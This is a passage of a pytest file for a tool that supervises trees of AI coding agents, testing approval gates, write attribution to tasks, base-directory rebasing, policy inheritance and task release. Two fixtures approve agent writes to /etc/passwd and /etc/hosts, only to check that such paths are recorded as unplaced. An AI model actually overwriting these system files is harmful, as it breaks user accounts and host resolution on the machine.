    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(ApprovalRequested(CHILD, pending(CHILD, "late")))
    # Nothing may relabel it into a state another kind would also claim.
    store.apply(StateChanged(CHILD, AgentState.AWAITING_INPUT, topic="anything"))

    owed = [o for o in store.snapshot().needs_you if o.node == CHILD]
    assert [type(o) for o in owed] == [ApprovalNeeded]


def test_resolving_a_late_approval_cannot_revive_a_finished_agent() -> None:
    """
    Reachable two ways, both after the end: the CLI's per-hook timeout cancels the
    gate, and Bridge.stop rejects every parked approval at shutdown. Both resolve
    unapproved, which is the branch that sets THINKING.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    store.apply(AgentFinished(CHILD, AgentState.DONE, ended_at=7.0))
    store.apply(ApprovalRequested(CHILD, pending(CHILD, "late")))
    store.apply(ApprovalResolved(CHILD, "late", approved=False, reason="shutting down"))

    snap = store.snapshot()
    rec = snap.get(CHILD)
    assert rec is not None
    assert rec.state is AgentState.DONE
    assert rec.ended_at == 7.0
    assert rec.pending == ()
    assert snap.any_active is False


def test_an_approval_still_parks_a_live_node() -> None:
    """The latch must not reach a node that has not ended."""
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "p1")))
    assert store.snapshot().nodes[ROOT].state is AgentState.AWAITING_APPROVAL

    store.apply(ApprovalResolved(ROOT, "p1", approved=False))
    assert store.snapshot().nodes[ROOT].state is AgentState.THINKING


# -- the clock every obligation's wait is measured against ---------------------


def test_an_approval_and_a_question_are_aged_and_sorted_on_one_clock() -> None:
    """
    ``Obligation.since`` is a ``time.monotonic()`` reading whichever kind carries it.

    The three kinds source it from three different fields -- an approval from
    ``PendingApproval.requested_at``, a question from ``AgentRecord.state_since``, a
    failure from ``ended_at`` -- and they are subtracted from one frame clock and
    sorted into one list. Fixing the pair of instants here rather than sampling a
    clock is what makes the sort assertion mean age rather than insertion order.
    """
    frame = 4_000.0
    parked_at = frame - 21_600.0  # six hours before the frame being rendered
    asked_at = frame - 60.0

    store = Store()
    # OTHER is spawned first, so it leads the tree order the walk follows. The sort
    # assertion below is the only thing that can put the older obligation on top, and
    # dropping the sort leaves this list in the opposite order.
    store.apply(spawn(OTHER), now=parked_at)
    store.apply(spawn(ROOT), now=parked_at)
    store.apply(StateChanged(OTHER, AgentState.AWAITING_INPUT), now=asked_at)
    store.apply(ApprovalRequested(ROOT, pending(ROOT, "parked", at=parked_at)), now=asked_at)

    owed = store.snapshot().needs_you
    ages = {o.node: frame - o.since for o in owed}
    assert ages[ROOT] == pytest.approx(21_600.0)
    assert ages[OTHER] == pytest.approx(60.0)
    # Oldest first, so the six-hour park outranks the one-minute question.
    assert [o.node for o in owed] == [ROOT, OTHER]


def test_every_parked_call_is_stamped_from_the_monotonic_clock() -> None:
    """
    Read over the source because no runtime seam can enforce it.

    ``requested_at`` is supplied by whoever constructs a ``PendingApproval``, and the
    store applies the record it is handed rather than restamping it -- restamping
    would tie an approval's age to when the UI thread got round to draining, which
    collapses to zero for every call queued behind a stalled frame loop, which is the
    one case the age is being read for. So the clock has to be right where it is
    taken, and this is the only place that can say so. ``time.time()`` here is not a
    loud failure: it renders as "0s" and sorts last.
    """
    root = pathlib.Path(__file__).resolve().parent.parent / "pptmstr"
    wrong: list[str] = []
    sites = 0
    for path in sorted(root.rglob("*.py")):
        tree = ast.parse(path.read_text(), filename=str(path))
        for call in ast.walk(tree):
            if not isinstance(call, ast.Call):
                continue
            if not (isinstance(call.func, ast.Name) and call.func.id == "PendingApproval"):
                continue
            stamp = next((k.value for k in call.keywords if k.arg == "requested_at"), None)
            if stamp is None:
                continue
            sites += 1
            if ast.unparse(stamp) != "time.monotonic()":
                wrong.append(f"{path.name}:{call.lineno} requested_at={ast.unparse(stamp)}")

    assert sites, "no PendingApproval construction found -- this pin has gone blind"
    assert not wrong, "requested_at must be time.monotonic(): " + "; ".join(wrong)


# -- a lead waiting on its workers -----------------------------------------------


def test_supervising_does_not_hold_the_render_loop_at_full_speed() -> None:
    """
    A supervising lead is doing nothing itself; its workers are.

    Those workers are separate nodes carrying their own active states, so a fan-out
    with anything running in it already holds the loop at full speed through them --
    counting the lead as well would count the same work twice. And a fan-out where
    every worker is itself parked at the gate is a tree that should idle, which is
    I8 as a CPU number rather than a claim.
    """
    assert not AgentState.SUPERVISING.is_active
    assert not AgentState.SUPERVISING.is_terminal


def test_a_supervising_lead_does_not_make_the_tree_look_busy() -> None:
    """
    ``any_active`` drives idling for the whole application, so the property above
    has to hold through the projection and not only on the enum.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(StateChanged(ROOT, AgentState.SUPERVISING), now=2.0)

    assert store.snapshot().any_active is False


def test_a_supervising_lead_is_kept_busy_by_a_worker_that_is_working() -> None:
    """
    The other half: the loop must stay hot while the fan-out is actually running,
    and it does so through the workers rather than through the lead.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(spawn(CHILD, ROOT), now=1.0)
    store.apply(StateChanged(ROOT, AgentState.SUPERVISING), now=2.0)
    store.apply(StateChanged(CHILD, AgentState.THINKING), now=2.0)

    assert store.snapshot().any_active is True


def test_a_supervising_lead_can_be_moved_off_the_state_like_any_other() -> None:
    """
    SUPERVISING is not terminal and nothing in the store treats it specially, so the
    turn-over state that follows the wait has to land. A state that stuck would leave
    a finished fan-out reading as one still in progress -- with a composer promising
    an answer that will never come.
    """
    store = Store()
    store.apply(spawn(ROOT), now=1.0)
    store.apply(StateChanged(ROOT, AgentState.SUPERVISING), now=2.0)
    store.apply(StateChanged(ROOT, AgentState.AWAITING_INPUT, topic=AWAITING_TOPIC), now=3.0)

    rec = store.snapshot().nodes[ROOT]
    assert rec.state is AgentState.AWAITING_INPUT
    assert rec.state_since == 3.0


# -- what the resolved approval leaves behind ---------------------------------

# One file, one hunk, two lines in and one out. The ``---``/``+++`` headers are the
# hazard the counter has to survive: they start with the content markers, so a
# counter that tests for those first reads this as three added and two removed.
ONE_FILE_DIFF = """--- a/pptmstr/store.py
+++ b/pptmstr/store.py
@@ -1,3 +1,4 @@
 unchanged
-gone
+new
+also new
"""


def writing(
    node: NodeId,
    pid: str = "p1",
    *,
    diff: str | None = ONE_FILE_DIFF,
    tool: str = "Write",
    args: dict[str, object] | None = None,
) -> PendingApproval:
    return PendingApproval(
        id=pid,
        node=node,
        tool_name=tool,
        tool_use_id="tu-1",
        raw_args={"file_path": "pptmstr/store.py", "content": "hi"} if args is None else args,
        summary="Write pptmstr/store.py",
        requested_at=1.0,
        diff=diff,
    )


def board(
    store: Store,
    *,
    claimer: NodeId | None = CHILD,
    task_id: str = "t1",
    touches: tuple[str, ...] = (),
) -> None:
    """
    A declared task, claimed by ``claimer`` unless that is None.
    """
    store.apply(TaskDeclared(Task(id=task_id, title="do a thing", touches=touches), node_id=ROOT))
    if claimer is not None:
        store.apply(TaskClaimRequested(claimer, request_id=f"k-{task_id}", task_id=task_id))


def test_count_diff_lines_does_not_read_the_headers_as_changed_lines() -> None:
    assert count_diff_lines(ONE_FILE_DIFF) == (2, 1)


def test_count_diff_lines_of_nothing_is_zero_rather_than_an_error() -> None:
    """
    Bash and the network tools park with ``diff=None``, and that is the majority of
    what an agent does. Raising here would make the reducer's most ordinary case the
    one that throws.
    """
    assert count_diff_lines(None) == (0, 0)
    assert count_diff_lines("") == (0, 0)


def test_a_deleted_horizontal_rule_is_a_removal_and_not_a_header() -> None:
    """
    Why the counter tracks hunk budgets instead of classifying by leading character.
    ``difflib`` prefixes a removed line with ``-``, so deleting the ``---`` rule that
    every planning record in this repository uses emits the physical line ``----``.
    A ``startswith("---")`` test reads that as a file header and loses the removal.
    """
    rule = "--- a/notes/x.md\n+++ b/notes/x.md\n@@ -1,3 +1,2 @@\n heading\n----\n body\n"
    assert count_diff_lines(rule) == (0, 1)


def test_an_approved_write_leaves_its_path_and_counts_on_the_task_its_writer_holds() -> None:
    """
    The whole point: ``PendingApproval.diff`` is dropped from ``pending`` in this
    arm, and after the write lands there is no snapshot it can be recomputed from.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites(
        paths=("pptmstr/store.py",), lines_added=2, lines_removed=1
    )


def test_one_file_written_three_times_is_one_path_and_three_writes_of_lines() -> None:
    """
    Paths merge as a set and lines sum. Counting an integer per approval instead
    would report this as three files, and the operator-facing line would read
    "wrote 3 files" for one file touched three times.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    for pid in ("p1", "p2", "p3"):
        store.apply(ApprovalRequested(CHILD, writing(CHILD, pid)))
        store.apply(ApprovalResolved(CHILD, pid, approved=True))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites(
        paths=("pptmstr/store.py",), lines_added=6, lines_removed=3
    )


def test_a_writer_holding_no_task_accumulates_nowhere_and_raises_nothing() -> None:
    """
    A lead editing a file outside any claimed task is ordinary, not an error. There
    is no task to hang the measurement on and none is invented.
    """
    store = Store()
    store.apply(spawn(ROOT))
    board(store, claimer=None)
    store.apply(ApprovalRequested(ROOT, writing(ROOT)))
    store.apply(ApprovalResolved(ROOT, "p1", approved=True))

    snap = store.snapshot()
    assert snap.tasks["t1"].writes == ApprovedWrites()
    assert snap.unattributed_writes == 0
    assert snap.nodes[ROOT].pending == ()


def test_a_write_by_one_worker_does_not_land_on_another_workers_task() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store, claimer=CHILD, task_id="mine")
    board(store, claimer=None, task_id="theirs")
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["theirs"].writes == ApprovedWrites()


def test_a_node_holding_two_open_tasks_attributes_its_write_to_neither() -> None:
    """
    Nothing in the snapshot says which of two claimed tasks a write was for, so
    neither gets it and the ambiguity is counted instead. Guessing by declaration
    order would put a made-up attribution into the one series this measures.

    A non-zero count here is a reading about the board rather than the writer: "one
    task at a time" is prose in ``templates.py`` that ``_pick_claim`` does not
    enforce, and this is what makes a breach of it visible instead of silent.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store, claimer=CHILD, task_id="first")
    board(store, claimer=CHILD, task_id="second")
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    snap = store.snapshot()
    assert snap.tasks["first"].writes == ApprovedWrites()
    assert snap.tasks["second"].writes == ApprovedWrites()
    assert snap.unattributed_writes == 1


def test_the_ambiguity_count_survives_later_intents() -> None:
    """
    The counter is carried through every reduction rather than recomputed, so an
    unrelated intent afterwards must not reset it. Without this the field reads zero
    forever and is indistinguishable from an ambiguity that never fired.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store, claimer=CHILD, task_id="first")
    board(store, claimer=CHILD, task_id="second")
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))
    store.apply(TopicChanged(CHILD, "something else"))

    assert store.snapshot().unattributed_writes == 1


def test_a_refused_approval_accumulates_nothing() -> None:
    """
    Nothing was written, so there is nothing to count. The diff on the record
    describes a write that never happened.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=False))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites()


def test_the_line_counts_are_what_the_operator_reviewed_not_what_reaches_disk() -> None:
    """
    An operator who rewrites a parked call's content before approving it resolves an
    approval whose diff was rendered from the arguments as parked. The line counts
    therefore describe the reviewed call. They cannot be recomputed in the reducer:
    the "before" text came off the disk at park time and this arm does no IO.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(
        ApprovalResolved(
            CHILD,
            "p1",
            approved=True,
            edited_args={"file_path": "pptmstr/store.py", "content": "something else entirely"},
        )
    )

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites(
        paths=("pptmstr/store.py",), lines_added=2, lines_removed=1
    )


def test_an_edited_path_is_the_one_recorded() -> None:
    """
    The line counts are an approximation on an edited call; the path is not.
    ``driver._park`` names correcting a wrong path as the first reason
    edit-then-approve exists, so taking the path from ``raw_args`` would name the
    file the operator rejected and miss the one they redirected the write to.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(
        ApprovalResolved(
            CHILD,
            "p1",
            approved=True,
            edited_args={"file_path": "pptmstr/board.py"},
        )
    )

    assert store.snapshot().tasks["t1"].writes.paths == ("pptmstr/board.py",)


def test_a_bash_resolution_records_neither_a_path_nor_lines() -> None:
    """
    Bash names no file and parks with no diff, so it measures nothing. **That is not
    evidence of compliance** -- a heredoc writing a file is invisible here and always
    will be. A clean record over a session of Bash calls has earned nothing.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(
        ApprovalRequested(
            CHILD, writing(CHILD, diff=None, tool="Bash", args={"command": "echo hi > f"})
        )
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites()


def test_a_notebook_edit_records_its_path_and_no_lines() -> None:
    """
    ``NotebookEdit`` carries ``notebook_path`` rather than ``file_path`` and
    ``render_diff`` returns None for it. Reading only ``file_path`` would record a
    notebook write as no write at all; the lines are simply a lower bound.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(
        ApprovalRequested(
            CHILD,
            writing(CHILD, diff=None, tool="NotebookEdit", args={"notebook_path": "notes/x.ipynb"}),
        )
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites(paths=("notes/x.ipynb",))


def test_an_absolute_write_under_the_agents_cwd_is_recorded_relative() -> None:
    """
    A declaration is relative to the session's directory by construction; a write path
    is whatever the model passed. The two are put in the same units through the
    agent's own cwd so the comparison in ``wrote_outside_declaration`` is on the same
    footing.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), cwd="/home/w/repo"))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(
        ApprovalRequested(
            CHILD, writing(CHILD, args={"file_path": "/home/w/repo/pptmstr/store.py"})
        )
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    writes = store.snapshot().tasks["t1"].writes
    assert writes.paths == ("pptmstr/store.py",)
    assert writes.unplaced == ()


def test_an_absolute_write_outside_the_cwd_is_unplaced_rather_than_divergent() -> None:
    """
    A path that cannot be put in the declaration's units is held apart from one that
    can. Reporting a units mismatch as a write outside the declaration would be a
    false accusation, and it is the failure this split exists to prevent.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), cwd="/home/w/repo"))
    store.apply(spawn(CHILD, ROOT))
    board(store, touches=("pptmstr/store.py",))
    store.apply(ApprovalRequested(CHILD, writing(CHILD, args={"file_path": "/etc/hosts"})))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    task = store.snapshot().tasks["t1"]
    assert task.writes.paths == ()
    assert task.writes.unplaced == ("/etc/hosts",)
    assert task.wrote_outside_declaration() == ()


def test_a_write_inside_the_declaration_does_not_diverge() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store, touches=("pptmstr/store.py", "tests/test_store.py"))
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].wrote_outside_declaration() == ()


def test_a_write_outside_the_declaration_is_named() -> None:
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store, touches=("pptmstr/board.py",))
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].wrote_outside_declaration() == ("pptmstr/store.py",)


def test_a_task_that_declared_nothing_diverges_from_nothing() -> None:
    """
    Empty ``touches`` is the absence of a declaration, not a declaration of no files.
    Reading it the other way puts every write by such a task out of scope and lights
    the affordance on every row that never declared, which is most of them.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].wrote_outside_declaration() == ()


def test_a_completed_task_stops_collecting_its_claimers_writes() -> None:
    """
    ``TaskCompleted`` keeps ``claimed_by``, so the state is the only thing that says
    the work is still open. A worker that keeps writing afterwards is no longer
    writing for that task, and counting it would grow a finished measurement.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(TaskCompleted(CHILD, "t1", at=5.0))
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    snap = store.snapshot()
    assert snap.tasks["t1"].writes == ApprovedWrites()
    assert snap.unattributed_writes == 0


def test_a_stale_resolution_counts_nothing_twice() -> None:
    """
    A double click resolves an approval that has already left ``pending``. The arm
    returns before it measures, so the counts cannot be applied a second time.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))
    board(store)
    store.apply(ApprovalRequested(CHILD, writing(CHILD)))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    assert store.snapshot().tasks["t1"].writes == ApprovedWrites(
        paths=("pptmstr/store.py",), lines_added=2, lines_removed=1
    )


# -- writes and declarations share a base (2026-09-04-two-mainline-defects, defect 1)


def test_a_session_measures_against_the_directory_it_was_launched_in() -> None:
    """
    The two halves named in the same units, which is the whole of the defect.

    ``bus.declare_task`` and ``templates.lead_briefing`` tell every lead that
    ``touches`` is relative to the directory the session was launched in, and this is
    that session: launched in ``repo/pptmstr``, declaring ``store.py``, writing
    ``repo/pptmstr/store.py``. A base that still climbed to the checkout would record
    ``pptmstr/store.py`` here and read a compliant agent as having written a file its
    task never named.
    """
    store = Store()
    launched = "/home/w/repo/pptmstr"
    store.apply(dataclasses.replace(spawn(ROOT), cwd=launched, session_base=launched))
    store.apply(spawn(CHILD, ROOT))
    board(store, touches=("store.py",))
    store.apply(
        ApprovalRequested(
            CHILD,
            writing(CHILD, args={"file_path": "/home/w/repo/pptmstr/store.py", "content": "hi"}),
        )
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    task = store.snapshot().tasks["t1"]
    assert task.writes.paths == ("store.py",)
    assert task.wrote_outside_declaration() == ()


def test_a_write_from_a_subdirectory_is_recorded_in_the_declarations_units() -> None:
    """
    A record whose ``cwd`` sits below its base still measures against the base.

    No launch builds that pair today -- ``LauncherState.spec`` resolves both from the
    same directory -- so it is constructed here directly. The reducer accepts the pair
    from any emitter and ``relative_write`` takes the two separately, so the branch is
    live code whichever way a record reaches it, and the agent here does exactly what
    it declared: without the base the write would be recorded as ``store.py`` and read
    as a file the task never named.
    """
    store = Store()
    store.apply(
        dataclasses.replace(spawn(ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo")
    )
    store.apply(
        dataclasses.replace(
            spawn(CHILD, ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo"
        )
    )
    board(store, touches=("pptmstr/store.py",))
    store.apply(
        ApprovalRequested(
            CHILD,
            writing(CHILD, args={"file_path": "/home/w/repo/pptmstr/store.py", "content": "hi"}),
        )
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    task = store.snapshot().tasks["t1"]
    assert task.writes.paths == ("pptmstr/store.py",)
    assert task.wrote_outside_declaration() == ()


def test_a_relative_write_from_a_subdirectory_is_rebased_onto_the_base() -> None:
    """
    The half a base alone does not fix. An absolute path only needs the base chopped
    off the front; a relative one was typed against the agent's ``cwd`` and has to be
    carried up to the base before it means the same file.

    A relative write path is read as relative to the agent's ``cwd``, which is what a
    path in a tool call means everywhere else. It is ambiguous in principle -- the same
    string could be meant from the base -- and unambiguous in practice, because
    ``Write`` and ``Edit`` take an absolute ``file_path`` and this branch exists for
    totality rather than for a shape the CLI sends.
    """
    store = Store()
    store.apply(
        dataclasses.replace(spawn(ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo")
    )
    store.apply(
        dataclasses.replace(
            spawn(CHILD, ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo"
        )
    )
    board(store, touches=("pptmstr/store.py",))
    store.apply(
        ApprovalRequested(CHILD, writing(CHILD, args={"file_path": "store.py", "content": "hi"}))
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    task = store.snapshot().tasks["t1"]
    assert task.writes.paths == ("pptmstr/store.py",)
    assert task.wrote_outside_declaration() == ()


def test_a_write_above_the_base_is_unplaced_rather_than_a_divergence() -> None:
    """
    A path that climbs out of the base has no spelling in the declaration's units, so
    there is nothing to compare it against. ``unplaced`` says that; naming it as
    out-of-declaration would accuse an agent on the strength of a ruler that does not
    reach.
    """
    store = Store()
    store.apply(
        dataclasses.replace(spawn(ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo")
    )
    store.apply(
        dataclasses.replace(
            spawn(CHILD, ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo"
        )
    )
    board(store, touches=("pptmstr/store.py",))
    store.apply(
        ApprovalRequested(CHILD, writing(CHILD, args={"file_path": "/etc/passwd", "content": "hi"}))
    )
    store.apply(ApprovalResolved(CHILD, "p1", approved=True))

    task = store.snapshot().tasks["t1"]
    assert task.writes.paths == ()
    assert task.writes.unplaced == ("/etc/passwd",)
    assert task.wrote_outside_declaration() == ()


def test_a_subagent_inherits_the_base_its_parent_was_launched_with() -> None:
    """
    The pair travels together. A sub-agent measured against a different base than the
    session it runs inside would report divergences that are only a change of ruler.
    """
    store = Store()
    store.apply(
        dataclasses.replace(spawn(ROOT), cwd="/home/w/repo/pptmstr", session_base="/home/w/repo")
    )
    store.apply(spawn(CHILD, ROOT))

    child = store.snapshot().nodes[CHILD]
    assert child.cwd == "/home/w/repo/pptmstr"
    assert child.session_base == "/home/w/repo"


# -- a session's record says which policy it is under


def test_a_session_announced_without_a_policy_reads_as_strict() -> None:
    """
    The default the whole adoption argument rests on. ``classify`` defaults to
    STRICT and ``AgentSession`` defaults to STRICT, so a record that defaulted to
    anything else would describe a gate nothing in this repository applies.
    """
    store = Store()
    store.apply(spawn(ROOT))

    assert store.snapshot().nodes[ROOT].policy is Policy.STRICT


def test_a_subagent_of_an_under_gated_session_reads_as_under_gated() -> None:
    """
    The record must agree with the gate. ``driver._policy_for`` takes the agent_id
    and declines to branch on it, so a sub-agent's Bash calls are classified against
    its session's allowlist -- and a sub-agent row showing STRICT under an
    AUTONOMOUS session would tell a supervising operator that calls are being
    reviewed when they are being auto-approved. A reassurance that is not true is
    worse than showing nothing.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), policy=Policy.AUTONOMOUS))
    store.apply(spawn(CHILD, ROOT))

    assert store.snapshot().nodes[CHILD].policy is Policy.AUTONOMOUS


def test_inheritance_does_not_widen_a_strict_session() -> None:
    """
    The other direction, which the AUTONOMOUS case alone cannot distinguish: a
    resolution that reached for the parent unconditionally and one that reached for
    it only when the intent is silent agree here and only here.
    """
    store = Store()
    store.apply(spawn(ROOT))
    store.apply(spawn(CHILD, ROOT))

    assert store.snapshot().nodes[CHILD].policy is Policy.STRICT


def test_a_stated_policy_survives_an_under_gated_parent() -> None:
    """
    An announce that names STRICT under an AUTONOMOUS parent keeps STRICT. The
    resolution reads "None means inherit", and this is the case that tells that apart
    from "the tighter value means inherit" -- a distinction that turns on ``Policy``
    members being truthy, which is a property of the enum and not of this arm.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), policy=Policy.AUTONOMOUS))
    store.apply(dataclasses.replace(spawn(CHILD, ROOT), policy=Policy.STRICT))

    assert store.snapshot().nodes[CHILD].policy is Policy.STRICT


def test_a_recovered_node_is_shown_under_the_policy_that_judged_its_call() -> None:
    """
    The placeholder built for an approval from an unannounced agent is the node most
    likely to be misread, because it exists only when the spawn hook did not fire.
    The approval that built it was classified under the session's policy, so leaving
    it at STRICT would show a tighter gate than the one that just judged it.
    """
    store = Store()
    store.apply(dataclasses.replace(spawn(ROOT), policy=Policy.AUTONOMOUS))
    store.apply(ApprovalRequested(CHILD, pending(CHILD)))

    assert store.snapshot().nodes[CHILD].policy is Policy.AUTONOMOUS


# -- releasing a task is not a no-op for the agent that released it ---------------
#
# Measured against the tree: release t1, call bare claim_task, and t1 comes straight
# back, because releasing does not change a task's age and nothing recorded who gave
# it up. Two agents can hold that between them indefinitely and neither can see it
# from its own transcript -- each sees an ordinary claim of an ordinary task.


def _two_tasks() -> Store:
    store = Store()
    store.apply(TaskDeclared(Task(id="t1", title="reviewer work", declared_at=0.0), ROOT))
    store.apply(TaskDeclared(Task(id="t2", title="builder work", declared_at=1.0), ROOT))
    return store


def test_a_bare_claim_does_not_hand_back_the_task_this_node_just_released() -> None:
    """
    The loop, closed. `t1` is the oldest and stays the oldest; what changes is that
    the agent which declined it is no longer offered it.
    """
    store = _two_tasks()
    store.apply(TaskClaimRequested(ROOT, request_id="k1"))
    store.apply(TaskReleased(ROOT, "t1", request_id="x1"))

    store.apply(TaskClaimRequested(ROOT, request_id="k2"))

    tasks = store.snapshot().tasks
    assert tasks["t2"].claimed_by == ROOT
    assert tasks["t1"].claimed_by is None
    assert tasks["t1"].state is TaskState.PENDING


def test_a_released_task_is_still_there_for_everyone_else() -> None:
    """
    The property that keeps this from trading a livelock for a lost task. One
    agent's refusal is not the board's, and the released task is still the oldest
    claimable thing for any other node.
    """
    store = _two_tasks()
    store.apply(TaskClaimRequested(ROOT, request_id="k1"))
    store.apply(TaskReleased(ROOT, "t1", request_id="x1"))

    store.apply(TaskClaimRequested(CHILD, request_id="k2"))

    assert store.snapshot().tasks["t1"].claimed_by == CHILD


def test_the_releaser_can_still_take_it_back_by_naming_it() -> None:
    """
    The asymmetry, and the reason no task is ever unreachable. Naming the id is an
    agent saying it means this one -- a second thought, a blocker cleared, or the
    spec re-read -- and the skip applies only to the claim that did not choose.
    """
    store = _two_tasks()
    store.apply(TaskClaimRequested(ROOT, request_id="k1"))
    store.apply(TaskReleased(ROOT, "t1", request_id="x1"))

    store.apply(TaskClaimRequested(ROOT, request_id="k2", task_id="t1"))

    assert store.snapshot().tasks["t1"].claimed_by == ROOT


def test_a_board_every_agent_has_declined_answers_nothing_rather_than_looping() -> None:
    """
    The end state, named so it is a decision rather than a surprise: when every
    claimable task has been declined by the asking node, a bare claim wins nothing
    and the tasks stay PENDING on the board for another agent or for a claim by id.
    That is the honest answer -- the alternative is handing back work the agent has
    already said it will not do.
    """
    store = _two_tasks()
    for request, task in (("k1", "t1"), ("k2", "t2")):
        store.apply(TaskClaimRequested(ROOT, request_id=request, task_id=task))
        store.apply(TaskReleased(ROOT, task, request_id=f"x-{task}"))

    store.apply(TaskClaimRequested(ROOT, request_id="k3"))

    tasks = store.snapshot().tasks
    assert [t.state for t in tasks.values()] == [TaskState.PENDING, TaskState.PENDING]


def test_releasing_the_same_task_twice_records_the_agent_once() -> None:
    """
    The tuple grows per agent, not per release, which is what bounds it without a
    cap: its ceiling is the number of agents that have ever run against this board.
    A cap would have to answer "which release do we forget?", and the only safe
    answer to that is the one that reintroduces the loop.
    """
    store = _two_tasks()
    for request in ("k1", "k2"):
        store.apply(TaskClaimRequested(ROOT, request_id=request, task_id="t1"))
        store.apply(TaskReleased(ROOT, "t1", request_id=f"x-{request}"))

    assert store.snapshot().tasks["t1"].released_by == (ROOT,)


def test_two_agents_declining_one_task_are_both_recorded() -> None:
    store = _two_tasks()
    for node in (ROOT, CHILD):
        store.apply(TaskClaimRequested(node, request_id=f"k-{node[1]}", task_id="t1"))
        store.apply(TaskReleased(node, "t1", request_id=f"x-{node[1]}"))

    assert store.snapshot().tasks["t1"].released_by == (ROOT, CHILD)


def test_a_refused_release_records_no_refusal_against_the_task() -> None:
    """
    The guard `TaskReleased` already had, extended to the new field. A node that
    does not hold the task cannot release it, and it must not be able to mark the
    task as declined either -- that would be a way to make work invisible to an
    agent that never touched it.
    """
    store = _two_tasks()
    store.apply(TaskClaimRequested(ROOT, request_id="k1", task_id="t1"))

    store.apply(TaskReleased(CHILD, "t1", request_id="x1"))

    assert store.snapshot().tasks["t1"].released_by == ()


def test_an_amended_specification_is_offered_again_to_the_agent_that_declined_it() -> None:
    """
    An agent that gave a task back declined the specification it was holding, and an
    amendment replaces exactly that. Holding the refusal against a spec nobody can
    now read would be judging an offer that no longer exists -- and this is the only
    route by which a task every agent has declined returns to circulation without
    somebody naming its id.
    """
    store = _two_tasks()
    store.apply(TaskClaimRequested(ROOT, request_id="k1", task_id="t1"))
    store.apply(TaskReleased(ROOT, "t1", request_id="x1"))

    store.apply(TaskAmended(task_id="t1", detail="the part that was missing"))
